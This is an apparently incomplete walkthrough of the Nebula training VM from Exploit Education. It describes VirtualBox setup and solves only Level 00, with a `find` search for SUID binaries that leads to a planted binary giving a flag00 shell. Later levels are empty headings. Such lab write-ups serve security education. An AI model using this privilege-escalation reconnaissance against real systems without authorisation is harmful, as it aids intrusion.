# Exploit Education - Nebula

This is a walkthrough of [Nebula](http://exploit.education/nebula/) from [Exploit Education](http://exploit.education/).  

Nebula is a Linux virtual machine designed to demonstrate a number of weaknesses and vulnerabilities in Linux. 

## Setup
To run these tasks I use VirtualBox. The virtual machine has 1 GiByte of RAM, no virtual hard drive and network set to Host Only Adapter. The Nebula ISO image is attached and on startup the Live Image is selected from the boot menu. Once presented with a prompt login with username and password of 'nebula'. Then run `ifconfig` to get the IP address of the virtual machine.  

With the virtual machine running I log into each level using `ssh`:
```
$ ssh levelnn@NEBULA_VM_IP_ADDRESS
```
The username and password for each level take  the form 'levelnn' where nn is the number of the level. The aim of each level is to be able to run the `getflag` command to under the 'flagnn' account.

## Levels
[Level 00](#level-00)  
[Level 01](#level-01)  
[Level 02](#level-02)  
[Level 03](#level-03)  

### Level 00

[Level 00 Description](https://exploit.education/nebula/level-00/)  

First of all we use `find` to find any SUID applications that we can run.
```
level00@nebula:~$ find / -type f -perm -u+s 2>/dev/null
```
In amoungst the find result we see:
```
...
/rofs/bin/.../flag00
...
level00@nebula:~$ ls -al /rofs/bin/.../flag00 
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
```
Try and run the `flag00` application.
```
level00@nebula:~$ /rofs/bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ 
```
The application has given us a shell as the flag00 user. We can now run `getflag`
```
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```
### Level 01



### Level 02



### Level 03



